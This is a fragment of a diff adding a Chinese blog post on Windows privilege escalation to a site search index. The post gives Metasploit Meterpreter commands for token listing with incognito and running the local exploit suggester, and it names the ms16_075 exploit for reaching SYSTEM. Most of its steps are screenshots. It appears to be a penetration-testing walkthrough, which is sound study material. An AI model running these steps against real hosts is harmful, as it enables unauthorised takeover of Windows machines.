+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use incognito   </span><br><span class="line">list_tokens -u  </span><br></pre></td></tr></table></figure>
+<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-19-47.png"></p>
+<h3 id="查找可利用的提权exp"><a href="#查找可利用的提权exp" class="headerlink" title="查找可利用的提权exp"></a>查找可利用的提权exp</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester  </span><br></pre></td></tr></table></figure>
+<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-11.png"></p>
+<h3 id="把当前msf回话放到后台，并记住其session值为5"><a href="#把当前msf回话放到后台，并记住其session值为5" class="headerlink" title="把当前msf回话放到后台，并记住其session值为5"></a>把当前msf回话放到后台，并记住其session值为5</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bg  </span><br></pre></td></tr></table></figure>
+<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-36.png"></p>
+<h3 id="利用ms16-075得到system权限"><a href="#利用ms16-075得到system权限" class="headerlink" title="利用ms16_075得到system权限"></a>利用ms16_075得到system权限</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-50.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
   </entry>
 </search>
